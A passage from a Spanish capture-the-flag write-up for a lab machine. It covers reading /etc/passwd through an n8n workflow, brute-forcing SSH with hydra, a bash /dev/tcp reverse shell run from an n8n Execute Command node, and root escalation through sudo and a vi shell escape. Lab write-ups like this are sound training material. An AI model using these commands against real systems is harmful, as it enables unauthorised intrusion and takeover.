<img src="/assets/images/THL-writeup-nodeCeption/Captura15.png">
</p>

Estamos dentro y vemos algunas cosillas, como la versión de la **plataforma n8n**, un usuario llamado **brian** y vemos un WorkFlow (flujo de trabajo).

### Analizando WorkFlow (Flujo de Trabajo) Encontrado en Plataforma n8n y Aplicando Fuerza Bruta a Servicio SSH {#WorkFlow}

Como mencioné antes, vimos un WorkFlow en el dashboard.

Selecciónalo para que podamos analizarlo:

<p align="center">
<img src="/assets/images/THL-writeup-nodeCeption/Captura16.png">
</p>

Hay 2 flujos ahí que parece hacer una **petición POST** para leer un archivo.

En la parte central de arriba, vemos 3 secciones, pero la que nos interesa es la sección de **Executions**.

Dale clic a esa sección y veremos una prueba exitosa del WorkFlow:

<p align="center">
<img src="/assets/images/THL-writeup-nodeCeption/Captura17.png">
</p>

Para ver mejor cómo funcionó el WorkFlow, dale doble clic al primer flujo llamado **Webhook**:

<p align="center">
<img src="/assets/images/THL-writeup-nodeCeption/Captura18.png">
</p>

Observa que nos muestra una URL de prueba y en la prueba, vemos que el body usa un parámetro llamado **file** y apunta al archivo `/etc/passwd`.

Sal de este flujo y entra en el segundo llamado **Leer Archivo**:

<p align="center">
<img src="/assets/images/THL-writeup-nodeCeption/Captura19.png">
</p>

Observa que al realizar la **petición POST**, que es el primer flujo, realiza la acción de leer un archivo en este segundo flujo. Ahí mismo podemos ver el resultado de la lectura del archivo, dándole clic al botón **View**:

<p align="center">
<img src="/assets/images/THL-writeup-nodeCeption/Captura20.png">
</p>

Resulta ser el archivo `/etc/passwd` de la máquina víctima, y al final vemos al **usuario thl**. Quizá le podamos aplicar fuerza bruta.

Vamos a intentarlo:
```bash
hydra -l 'thl' -P /usr/share/wordlists/rockyou.txt ssh://192.168.100.120 -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-20 14:56:46
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://192.168.100.120:22/
[22][ssh] host: 192.168.100.120   login: thl   password: *********
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 19 final worker threads did not complete until end.
[ERROR] 19 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-20 14:56:53
```
Excelente, tenemos la contraseña.

Probémosla:
```bash
ssh thl@192.168.100.120
thl@192.168.100.120's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-63-generic x86_64)
...
Last login: Fri Jul 18 13:04:48 2025
thl@nodeception:~$ whoami
thl
```
Estamos dentro.

Aquí mismo encontraremos la flag del usuario:
```bash
thl@nodeception:~$ ls
user.txt
thl@nodeception:~$ cat user.txt
...
```

### Creando un WorkFlow para Ejecutar Comandos y Obtener una Reverse Shell {#WFmalicioso}

Dentro de la **plataforma n8n**, existe un nodo llamado **Execute Command** que nos permite ejecutar comandos dentro de la máquina host.

Vamos a crear un nuevo WorkFlow desde el dashboard, dale clic al botón **Create Workflow**:

<p align="center">
<img src="/assets/images/THL-writeup-nodeCeption/Captura21.png">
</p>

En el centro, podemos ver que se pueden añadir WorkFlows, así que dale clic ahí:

<p align="center">
<img src="/assets/images/THL-writeup-nodeCeption/Captura22.png">
</p>

Ahora, en la parte derecha nos saldrá un buscador, ahí podemos buscar el nodo **Execute Command**.

Búscalo y elígelo:

<p align="center">
<img src="/assets/images/THL-writeup-nodeCeption/Captura23.png">
</p>

Observa que podemos ejecutar un comando solo una vez (esto se puede desactivar). Vemos el input donde podemos meter los comandos y el botón **Execute Step** que es para ejecutar el comando:

<p align="center">
<img src="/assets/images/THL-writeup-nodeCeption/Captura24.png">
</p>

Además, en la parte derecha veremos el resultado del comando ejecutado.

Probemos a ejecutar el comando **whoami**:

<p align="center">
<img src="/assets/images/THL-writeup-nodeCeption/Captura25.png">
</p>

Muy bien, funcionó y muestra que somos el **usuario thl**.

Comprobemos si tenemos conexión entre la máquina víctima y nuestra máquina mandando una **traza ICMP**.

Abre un capturador de **trazas ICMP** con **tcpdump**:
```bash
tcpdump -i eth0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```

Ahora, haz un **ping** a tu máquina indicando un solo paquete y ejecuta el comando:

<p align="center">
<img src="/assets/images/THL-writeup-nodeCeption/Captura26.png">
</p>

Revisa el **tcpdump**:
```bash
tcpdump -i eth0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
16:19:30.567932 IP 192.168.100.120 > Tu_IP: ICMP echo request, id 16742, seq 1, length 64
16:19:30.568712 IP Tu_IP > 192.168.100.120: ICMP echo reply, id 16742, seq 1, length 64
...
14 packets captured
14 packets received by filter
0 packets dropped by kernel
```
Excelente, tenemos conexión.

Vamos a mandarnos una **Reverse Shell**.

Abre un listener con **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
```

Usemos el siguiente comando:
```bash
bash -c 'bash -i >& /dev/tcp/Tu_IP/443 0>&1'
```

Escribelo en el input y ejecútalo:

<p align="center">
<img src="/assets/images/THL-writeup-nodeCeption/Captura27.png">
</p>

Observa la **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.100.120] 37520
bash: cannot set terminal process group (9960): Inappropriate ioctl for device
bash: no job control in this shell
thl@nodeception:~$ whoami
whoami
thl
thl@nodeception:~$
```
Estamos dentro.

Obtengamos una sesión interactiva:
```bash
# Paso 1:
script /dev/null -c bash

# Paso 2:
CTRL + Z

# Paso 3:
stty raw -echo; fg

# Paso 4:
reset -> xterm

# Paso 5:
export TERM=xterm && export SHELL=bash && stty rows 51 columns 189
```
Puedes continuar con esta sesión o desde el **servicio SSH**.

## Post Explotación {#Post}

### Escalando Privilegios Abusando de Privilegios de Usuario y Aplicando Shell Escape con Binario vi {#sudo}

Veamos qué privilegios tiene nuestro usuario:
```bash
thl@nodeception:~$ sudo -l
Matching Defaults entries for thl on nodeception:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User thl may run the following commands on nodeception:
    (ALL) NOPASSWD: /usr/bin/vi
    (ALL : ALL) ALL
```
Tenemos privilegios para usar cualquier comando. Además, también podemos usar **vi** con privilegios.

Como podemos ejecutar cualquier comando como **Root**, hay muchas posibilidades que podemos usar para escalar privilegios.

La más rápida sería usar la **Bash** con privilegios:
```bash
thl@nodeception:~$ sudo bash -p
[sudo] password for thl: 
root@nodeception:/home/thl# whoami
root
```
Funciona.

La cuestión aquí es que se necesitó la contraseña del **usuario thl**, contraseña que ya tenemos por aplicar fuerza bruta al **servicio SSH**.

Pero, digamos que únicamente tenemos privilegios sobre el **binario vi**, entonces podemos buscar en la **guía de GTFOBins** una forma de abusar de este binario:
* <a href="https://gtfobins.github.io/gtfobins/vi/" target="_blank">GTFOBins: vi</a>

Usaremos el siguiente comando:

<p align="center">
<img src="/assets/images/THL-writeup-nodeCeption/Captura28.png">
</p>

Apliquémoslo:
```bash
thl@nodeception:~$ sudo vi -c ':!/bin/bash' /dev/null

root@nodeception:/home/thl# whoami
root
```
Listo, volvemos a ser **Root**.

Busquemos la última flag:
```bash
root@nodeception:/home/thl# cd /root
root@nodeception:~# ls
root.txt
root@nodeception:~# cat root.txt
...
```
Y con esto, terminamos la máquina.
